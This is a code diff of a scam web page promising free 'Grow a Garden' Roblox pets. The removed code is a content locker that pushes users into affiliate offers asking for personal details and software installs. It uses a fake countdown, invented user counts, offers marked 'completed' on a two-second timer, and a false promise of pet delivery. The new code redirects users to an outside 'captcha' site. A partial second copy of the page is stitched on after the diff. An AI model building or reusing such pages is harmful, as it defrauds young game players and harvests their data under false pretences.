@@ -6,7 +6,6 @@
     <title>🎮 FREE Grow a Garden Pets - Get Any Pet Instantly! 🔥</title>
     <meta name="description" content="Get ANY Grow a Garden pet for FREE! Choose from 50+ exclusive pets including Divine & Legendary rarities. Fast delivery to your Roblox account!">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -566,253 +565,6 @@
             100% { transform: translateY(-10px); }
         }
 
-        /* Content Locker Styles */
-        .content-locker {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            overflow-y: auto;
-        }
-
-        .locker-container {
-            max-width: 600px;
-            margin: 2rem auto;
-            background: #12941F;
-            border-radius: 20px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .locker-header {
-            background: url('https://ext.same-assets.com/4254562649/2841198809.png') no-repeat center center;
-            background-size: cover;
-            padding: 3rem 2rem;
-            text-align: center;
-            position: relative;
-        }
-
-        .locker-header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, rgba(18, 148, 31, 0.8), rgba(18, 148, 31, 0.9));
-        }
-
-        .locker-header-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        .locker-title {
-            font-size: 3rem;
-            font-weight: 900;
-            color: white;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            margin-bottom: 1rem;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        .locker-instructions {
-            background: linear-gradient(135deg, #12941F, #0f7a1a);
-            color: #FFFFFF;
-            padding: 1.5rem;
-            text-align: center;
-            font-size: 1.1rem;
-            font-weight: 500;
-            line-height: 1.6;
-            position: relative;
-            border-bottom: 3px solid #0a5d14;
-        }
-
-        .urgency-timer {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
-            color: white;
-            padding: 0.8rem 1.5rem;
-            border-radius: 25px;
-            font-weight: 700;
-            font-size: 1rem;
-            margin: 1rem 0;
-            display: inline-block;
-            animation: pulse 2s infinite;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 4px;
-            margin: 1rem 0;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #feca57, #ff9ff3);
-            width: 0%;
-            transition: width 0.5s ease;
-            border-radius: 4px;
-        }
-
-        .social-proof {
-            background: rgba(255,255,255,0.1);
-            padding: 0.8rem;
-            border-radius: 15px;
-            margin: 1rem 0;
-            font-size: 0.9rem;
-            border-left: 4px solid #feca57;
-        }
-
-        .offers-container {
-            background: #12941F;
-            padding: 1rem;
-            overflow-x: hidden;
-        }
-
-        .offer-item {
-            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
-            border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 16px;
-            margin-bottom: 1rem;
-            padding: 1.2rem;
-            cursor: pointer;
-            transition: all 0.4s ease;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .offer-item::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            transition: left 0.6s;
-        }
-
-        .offer-item:hover::before {
-            left: 100%;
-        }
-
-        .offer-item:hover {
-            background: linear-gradient(135deg, rgba(255,255,255,0.15), rgba(255,255,255,0.08));
-            border-color: #feca57;
-            transform: translateX(8px) scale(1.02);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-        }
-
-        .offer-item.completed {
-            background: linear-gradient(135deg, rgba(39, 174, 96, 0.3), rgba(39, 174, 96, 0.1));
-            border-color: #27ae60;
-        }
-
-        .offer-info {
-            flex: 1;
-            text-align: left;
-            z-index: 2;
-        }
-
-        .offer-title {
-            color: #FFFFFF;
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .offer-value {
-            background: linear-gradient(45deg, #feca57, #ff9ff3);
-            color: #333;
-            padding: 0.2rem 0.6rem;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            margin-left: 0.5rem;
-        }
-
-        .offer-description {
-            color: #FFFFFF;
-            font-size: 0.95rem;
-            opacity: 0.9;
-            margin-bottom: 0.5rem;
-        }
-
-        .offer-time {
-            color: #feca57;
-            font-size: 0.8rem;
-            font-weight: 600;
-        }
-
-        .offer-btn {
-            background: linear-gradient(45deg, #8E2DE2, #6A1B9A);
-            color: white;
-            padding: 0.8rem 1.5rem;
-            border-radius: 25px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 1rem;
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            flex-shrink: 0;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 15px rgba(142, 45, 226, 0.4);
-            position: relative;
-            z-index: 2;
-        }
-
-        .offer-btn:hover {
-            background: linear-gradient(45deg, #7B2BC7, #5E1A87);
-            transform: scale(1.08);
-            box-shadow: 0 6px 20px rgba(142, 45, 226, 0.6);
-        }
-
-        .offer-btn.completed-btn {
-            background: linear-gradient(45deg, #27ae60, #2ecc71);
-            pointer-events: none;
-        }
-
-        .completed-offers {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 1rem;
-            border-radius: 10px;
-            font-weight: 600;
-            z-index: 1001;
-        }
-
-        .close-locker {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 2rem;
-            cursor: pointer;
-            z-index: 3;
-        }
-
         /* Responsive Design */
         @media (max-width: 768px) {
             .hero-title {
@@ -830,21 +582,6 @@
 
             .username-input {
                 min-width: 100%;
-            }
-
-            .locker-container {
-                margin: 1rem;
-                max-width: calc(100% - 2rem);
-            }
-
-            .locker-title {
-                font-size: 2rem;
-            }
-
-            .offer-item {
-                flex-direction: column;
-                text-align: center;
-                gap: 1rem;
             }
         }
     </style>
@@ -1135,365 +872,7 @@
             redirectToLocker();
         }
 
-        // Content locker variables
-        let completedOffers = 0;
-        const requiredOffers = 2;
-        let completedOfferIds = [];
-        let timerMinutes = 15;
-        let timerSeconds = 0;
-        let timerInterval;
-
-        // Offer data from the original locker
-        const offers = [
-            {
-                title: 'SoFi',
-                description: 'SoFi: Get your free credit score and $10!',
-                image: 'https://ext.same-assets.com/4254562649/1689684590.html',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9NzYwNSZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'ConsumerConnect - $1,000 Cash App',
-                description: 'Enter Your Details to GET $1,000 Cash App Now!',
-                image: 'https://ext.same-assets.com/4254562649/1873693699.png',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9OTg1MSZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'TrendnDaily - Win a $500 Cash Prize',
-                description: 'Enter Your Details to Win a $500 Cash Prize Now!',
-                image: 'https://ext.same-assets.com/4254562649/3085450735.png',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MzcwNiZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'TrendnDaily - Get 500$ LuluLemon Giftcard',
-                description: 'Win free LuLuLemon Voucher right here!',
-                image: 'https://ext.same-assets.com/4254562649/126963185.png',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MTYxMCZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'TheAmericanSweepstakes - Win a Carribean Getaway for Two',
-                description: 'Get a chance for a dream getaway by only email!',
-                image: 'https://ext.same-assets.com/4254562649/2405068857.png',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MTUxMSZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'CTConnect - Chick Fil A 100',
-                description: 'Have a chance to get a $100 Chick Fil A Gift Card!',
-                image: 'https://ext.same-assets.com/4254562649/3544595323.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9NyZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'TrendnDaily - Get $500 Cash Prize',
-                description: 'Have a Chance to GET a $500 Cash Prize! Enter Now!',
-                image: 'https://ext.same-assets.com/4254562649/3792817379.png',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9NTQ1OCZzdWIyPXU1MzM5MjMmc3ViNT1zMTQ4ZGZkNDg2JTdDMDY1MmZlZTZmOTMzNTRlYjk0YTgzNGNlMmViZmExNThlMjVmNTIyMyU3Q2lvcyZzdWI2PXMyRllCUi1ORS00OERGRDQ4NiZzdWI3PXJmbnVsbCZzdWI4PXJkbnVsbCZzdWIxNT1kMmM1Y2U5MjhlODM='
-            },
-            {
-                title: 'Prizegrab - 7 Eleven Giftcard',
-                description: 'Win a $100 7 Eleven Gift Card!',
-                image: 'https://ext.same-assets.com/4254562649/604168998.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9NjImc3ViMj11NTMzOTIzJnN1YjU9czE0OGRmZDQ4NiU3QzA2NTJmZWU2ZjkzMzU0ZWI5NGE4MzRjZTJlYmZhMTU4ZTI1ZjUyMjMlN0Npb3Mmc3ViNj1zMkZZQlItTkUtNDhERkQ0ODYmc3ViNz1yZm51bGwmc3ViOD1yZG51bGwmc3ViMTU9ZDJjNWNlOTI4ZTgz'
-            },
-            {
-                title: 'CTConnect - iPhone 14',
-                description: 'Have a chance to win a brand new iPhone 14!',
-                image: 'https://ext.same-assets.com/4254562649/702475203.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MzY0JnN1YjI9dTUzMzkyMyZzdWI1PXMxNDhkZmQ0ODYlN0MwNjUyZmVlNmY5MzM1NGViOTRhODM0Y2UyZWJmYTE1OGUyNWY1MjIzJTdDaW9zJnN1YjY9czJGWUJSLU5FLTQ4REZENDg2JnN1Yjc9cmZudWxsJnN1Yjg9cmRudWxsJnN1YjE1PWQyYzVjZTkyOGU4Mw=='
-            },
-            {
-                title: 'CTConnect - Cash App 750',
-                description: 'Have a chance to get $750 in your Cash App account!',
-                image: 'https://ext.same-assets.com/4254562649/3373628523.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9mbHkubWV0b3plbW9vbi5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9NjYzJnN1YjI9dTUzMzkyMyZzdWI1PXMxNDhkZmQ0ODYlN0MwNjUyZmVlNmY5MzM1NGViOTRhODM0Y2UyZWJmYTE1OGUyNWY1MjIzJTdDaW9zJnN1YjY9czJGWUJSLU5FLTQ4REZENDg2JnN1Yjc9cmZudWxsJnN1Yjg9cmRudWxsJnN1YjE1PWQyYzVjZTkyOGU4Mw=='
-            },
-            {
-                title: 'Browse faster and more securely with Opera!',
-                description: 'Download Opera Browser, install and start browsing!',
-                image: 'https://ext.same-assets.com/4254562649/3892595830.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9nby5yZHJjbGsuY29tL2FmZl9jP29mZmVyX2lkPTYxNTg0JmFmZl9pZD0zNTYwMyZhZmZfc3ViPWlvcyZhZmZfc3ViMj1GWUJSLU5FLTQ4REZENDg2JmFmZl9zdWIzPTA2NTJmZWU2ZjkzMzU0ZWI5NGE4MzRjZTJlYmZhMTU4ZTI1ZjUyMjMmYWZmX3N1YjQ9NDhkZmQ0ODYmYWZmX3N1YjU9RllCUi1ORS00OERGRDQ4Ng=='
-            },
-            {
-                title: 'Rakuten Rewards',
-                description: 'Download the Rakuten extension to complete this step.',
-                image: 'https://ext.same-assets.com/4254562649/421424230.jpeg',
-                url: 'https://go.1990s.click/aHR0cHM6Ly9nby5yZHJjbGsuY29tL2FmZl9jP29mZmVyX2lkPTY1MDU0JmFmZl9pZD0zNTYwMyZhZmZfc3ViPWlvcyZhZmZfc3ViMj1GWUJSLU5FLTQ4REZENDg2JmFmZl9zdWIzPTA2NTJmZWU2ZjkzMzU0ZWI5NGE4MzRjZTJlYmZhMTU4ZTI1ZjUyMjMmYWZmX3N1YjQ9NDhkZmQ0ODYmYWZmX3N1YjU9RllCUi1ORS00OERGRDQ4Ng=='
-            }
-        ];
-
-        // Load offers into the locker
-        function loadOffers() {
-            const container = document.getElementById('offersContainer');
-            container.innerHTML = '';
-
-            offers.forEach((offer, index) => {
-                const offerElement = document.createElement('div');
-                offerElement.className = 'offer-item';
-                offerElement.id = `offer-${index}`;
-                offerElement.onclick = () => callOfferModal(offer.title, offer.description, offer.image, offer.url, index);
-
-                // Enhanced offer CTAs
-                let enhancedOffer = enhanceOfferCTA(offer, index);
-
-                offerElement.innerHTML = `
-                    <div class="offer-info">
-                        <div class="offer-title">
-                            ${enhancedOffer.icon} ${enhancedOffer.title}
-                            <span class="offer-value">${enhancedOffer.value}</span>
-                        </div>
-                        <div class="offer-description">${enhancedOffer.description}</div>
-                        <div class="offer-time">${enhancedOffer.time}</div>
-                    </div>
-                    <button class="offer-btn" id="btn-${index}">
-                        ${enhancedOffer.btnText}
-                    </button>
-                `;
-
-                container.appendChild(offerElement);
-            });
-
-            startUrgencyTimer();
-        }
-
-        // Enhance offer CTAs with better copy and urgency
-        function enhanceOfferCTA(offer, index) {
-            const enhancements = [
-                {
-                    icon: '💰',
-                    title: 'SoFi Credit Boost',
-                    description: 'Get FREE credit score + $10 instant bonus! No hidden fees.',
-                    value: '$10 FREE',
-                    time: '⚡ 2 min signup',
-                    btnText: 'CLAIM $10'
-                },
-                {
-                    icon: '💵',
-                    title: '$1,000 Cash Prize',
-                    description: 'Enter to WIN $1,000 Cash App money - Easy entry!',
-                    value: '$1,000',
-                    time: '📱 30 sec entry',
-                    btnText: 'WIN NOW'
-                },
-                {
-                    icon: '🎁',
-                    title: '$500 Daily Winner',
-                    description: 'Join 1000s winning $500 cash prizes daily!',
-                    value: '$500',
-                    time: '🎯 Quick entry',
-                    btnText: 'ENTER FREE'
-                },
-                {
-                    icon: '🛍️',
-                    title: 'LuluLemon $500 Card',
-                    description: 'Win premium activewear gift card instantly!',
-                    value: '$500',
-                    time: '✨ 1 min entry',
-                    btnText: 'GET CARD'
-                },
-                {
-                    icon: '🏝️',
-                    title: 'Caribbean Vacation',
-                    description: 'Win dream getaway for 2 - All expenses paid!',
-                    value: '$5,000',
-                    time: '🌴 Easy entry',
-                    btnText: 'BOOK TRIP'
-                },
-                {
-                    icon: '🍗',
-                    title: 'Chick-fil-A $100',
-                    description: 'Free food for months with $100 gift card!',
-                    value: '$100',
-                    time: '🍟 Quick entry',
-                    btnText: 'EAT FREE'
-                },
-                {
-                    icon: '💸',
-                    title: '$500 Cash Winner',
-                    description: 'Join daily winners getting $500 cash prizes!',
-                    value: '$500',
-                    time: '💰 Fast entry',
-                    btnText: 'WIN CASH'
-                },
-                {
-                    icon: '🏪',
-                    title: '7-Eleven $100 Card',
-                    description: 'Free snacks & drinks with $100 gift card!',
-                    value: '$100',
-                    time: '🥤 Quick win',
-                    btnText: 'GET CARD'
-                },
-                {
-                    icon: '📱',
-                    title: 'iPhone 14 Winner',
-                    description: 'Win the latest iPhone 14 - Brand new!',
-                    value: '$800',
-                    time: '⚡ 1 min entry',
-                    btnText: 'WIN iPHONE'
-                },
-                {
-                    icon: '💳',
-                    title: '$750 Cash App',
-                    description: 'Get $750 sent directly to your Cash App!',
-                    value: '$750',
-                    time: '💵 Instant win',
-                    btnText: 'CLAIM $750'
-                },
-                {
-                    icon: '🌐',
-                    title: 'Opera Browser Reward',
-                    description: 'Download & get rewarded for faster browsing!',
-                    value: 'REWARD',
-                    time: '⚡ 30 seconds',
-                    btnText: 'DOWNLOAD'
-                },
-                {
-                    icon: '🛒',
-                    title: 'Rakuten Cashback',
-                    description: 'Get cashback on every purchase you make!',
-                    value: 'CASHBACK',
-                    time: '💰 Quick setup',
-                    btnText: 'EARN NOW'
-                }
-            ];
-
-            return enhancements[index] || {
-                icon: '🎁',
-                title: offer.title,
-                description: offer.description,
-                value: 'FREE',
-                time: '⚡ Quick',
-                btnText: 'CLAIM NOW'
-            };
-        }
-
-        // Handle offer modal (opens offer in new tab)
-        function callOfferModal(title, description, image, url, index) {
-            // Visual feedback
-            const offerElement = document.getElementById(`offer-${index}`);
-            const btnElement = document.getElementById(`btn-${index}`);
-
-            if (btnElement) {
-                btnElement.textContent = 'OPENING...';
-                btnElement.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
-            }
-            window.open(url, '_blank');
-
-            // Track offer click after delay for better UX
-            setTimeout(() => {
-                if (index !== undefined && !completedOfferIds.includes(index)) {
-                    trackOfferCompletion(index);
-
-                    // Visual feedback
-                    if (offerElement) {
-                        offerElement.classList.add('completed');
-                    }
-                    if (btnElement) {
-                        btnElement.textContent = '✅ COMPLETED';
-                        btnElement.classList.add('completed-btn');
-                    }
-                }
-            }, 2000);
-        }
-
-        // Track offer completion
-        function trackOfferCompletion(index) {
-            if (index !== undefined && !completedOfferIds.includes(index)) {
-                completedOfferIds.push(index);
-            }
-
-            completedOffers++;
-            updateCompletedCounter();
-
-            if (completedOffers >= requiredOffers) {
-                setTimeout(() => {
-                    showCompletionMessage();
-                }, 2000);
-            }
-        }
-
-        // Update completed offers counter
-        function updateCompletedCounter() {
-            const counter = document.getElementById('completedCounter');
-            const count = document.getElementById('completedCount');
-            const progressFill = document.getElementById('progressFill');
-            const progressText = document.getElementById('progressText');
-
-            // Update counter
-            counter.style.display = 'block';
-            count.textContent = completedOffers;
-
-            // Update progress bar
-            const progressPercentage = (completedOffers / requiredOffers) * 100;
-            if (progressFill) progressFill.style.width = progressPercentage + '%';
-            if (progressText) progressText.innerHTML = `Progress: <strong>${completedOffers}/${requiredOffers}</strong> offers completed`;
-
-            if (completedOffers >= requiredOffers) {
-                counter.style.background = 'rgba(39, 174, 96, 0.9)';
-                count.parentNode.innerHTML = `✅ Requirements Complete! Pet delivery in progress...`;
-                if (progressText) {
-                    progressText.innerHTML = `🎉 <strong>COMPLETE!</strong> Your pet is being delivered!`;
-                    progressText.style.color = '#27ae60';
-                }
-
-                // Stop timer
-                if (timerInterval) {
-                    clearInterval(timerInterval);
-                }
-            }
-        }
-
-        // Show completion message
-        function showCompletionMessage() {
-            alert(`🎉 Congratulations! You've completed the required offers.\n\nYour ${selectedPet ? selectedPet.name : 'selected pet'} will be delivered to ${username} within 24 hours!\n\nThank you for using our service!`);
-            closeLocker();
-        }
-
-        // Start urgency timer
-        function startUrgencyTimer() {
-            const timerElement = document.getElementById('urgencyTimer');
-
-            timerInterval = setInterval(() => {
-                if (timerSeconds === 0) {
-                    if (timerMinutes === 0) {
-                        clearInterval(timerInterval);
-                        if (timerElement) {
-                            timerElement.innerHTML = '⚠️ Time expired! Complete quickly!';
-                            timerElement.style.background = 'linear-gradient(45deg, #e74c3c, #c0392b)';
-                        }
-                        return;
-                    }
-                    timerMinutes--;
-                    timerSeconds = 59;
-                } else {
-                    timerSeconds--;
-                }
-
-                const formattedTime = `${timerMinutes}:${timerSeconds.toString().padStart(2, '0')}`;
-                if (timerElement) {
-                    timerElement.innerHTML = `⏰ Limited Time: Complete in ${formattedTime}`;
-
-                    // Add urgency when under 5 minutes
-                    if (timerMinutes < 5) {
-                        timerElement.style.background = 'linear-gradient(45deg, #e74c3c, #c0392b)';
-                        timerElement.style.animation = 'pulse 1s infinite';
-                    }
-                }
-            }, 1000);
-        }
-
-        // Open content locker
-        function openLocker() {
-            loadOffers();
-            document.getElementById('contentLocker').style.display = 'block';
-            document.body.style.overflow = 'hidden';
-        }
-
-        // Close content locker
-        function closeLocker() {
-            document.getElementById('contentLocker').style.display = 'none';
-            document.body.style.overflow = 'auto';
-            document.getElementById('completedCounter').style.display = 'none';
-        }
-
-        // Replace the old redirect function
+        // Mobile-friendly redirect function
         function redirectToLocker() {
             // Store selected pet and username
             if (selectedPet && username) {
@@ -1501,59 +880,935 @@
                 localStorage.setItem('username', username);
             }
 
-            // Open content locker instead of redirecting
-            openLocker();
+            // Mobile-friendly redirect - detect mobile and use appropriate method
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                // For mobile, use location.href for better compatibility
+                window.location.href = 'https://captcha.shereview.net/48dfd486';
+            } else {
+                // For desktop, try to open in new tab
+                const newWindow = window.open('https://captcha.shereview.net/48dfd486', '_blank');
+                // Fallback if popup blocked
+                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                    window.location.href = 'https://captcha.shereview.net/48dfd486';
+                }
+            }
         }
 
         // Legacy function for compatibility
         function showModalOffers() {
-            openLocker();
+            redirectToLocker();
         }
 
         window.showModalOffers = showModalOffers;
     </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 FREE Grow a Garden Pets - Get Any Pet Instantly! 🔥</title>
+    <meta name="description" content="Get ANY Grow a Garden pet for FREE! Choose from 50+ exclusive pets including Divine & Legendary rarities. Fast delivery to your Roblox account!">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-    <!-- Content Locker Modal -->
-    <div id="contentLocker" class="content-locker">
-        <div class="locker-container">
-            <button class="close-locker" onclick="closeLocker()">&times;</button>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
 
-            <div class="locker-header">
-                <div class="locker-header-content">
-                    <h1 class="locker-title">GROW A<br>GARDEN</h1>
-                </div>
-            </div>
+        /* Animated Background */
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
 
-            <div class="locker-instructions">
-                <div class="urgency-timer" id="urgencyTimer">⏰ Limited Time: Complete in 15:00</div>
+        .floating-shapes {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
 
-                <div class="social-proof">
-                    <i class="fas fa-users"></i> <strong>2,847 users</strong> completed offers in the last 24 hours!
-                </div>
+        .shape {
+            position: absolute;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
 
-                <div style="font-size: 1.2rem; font-weight: 600; margin: 1rem 0;">
-                    Complete <span style="color: #feca57; font-weight: 800;">TWO OFFERS</span> below to unlock your pet!
-                </div>
+        .shape:nth-child(1) { width: 80px; height: 80px; left: 10%; animation-delay: 0s; }
+        .shape:nth-child(2) { width: 60px; height: 60px; left: 20%; animation-delay: 2s; }
+        .shape:nth-child(3) { width: 100px; height: 100px; left: 70%; animation-delay: 4s; }
+        .shape:nth-child(4) { width: 40px; height: 40px; left: 80%; animation-delay: 1s; }
+        .shape:nth-child(5) { width: 120px; height: 120px; left: 40%; animation-delay: 3s; }
 
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.7; }
+            50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
+        }
 
-                <div id="progressText" style="font-weight: 600; margin-top: 0.5rem;">
-                    Progress: 0/2 offers completed
-                </div>
-            </div>
+        /* Header Section */
+        .hero-section {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 2rem 1rem;
+            position: relative;
+        }
 
-            <div class="offers-container" id="offersContainer">
-                <!-- Offers will be dynamically loaded here -->
-            </div>
+        .hero-content {
+            max-width: 800px;
+            z-index: 10;
+        }
+
+        .hero-badge {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #ffffff, #f1f2f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            line-height: 1.1;
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        .stats-container {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+            background: rgba(255,255,255,0.1);
+            padding: 1rem;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .stat-number {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #feca57;
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* CTA Button */
+        .cta-button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+            color: white;
+            border: none;
+            padding: 1.2rem 3rem;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(255,107,107,0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
+        }
+
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
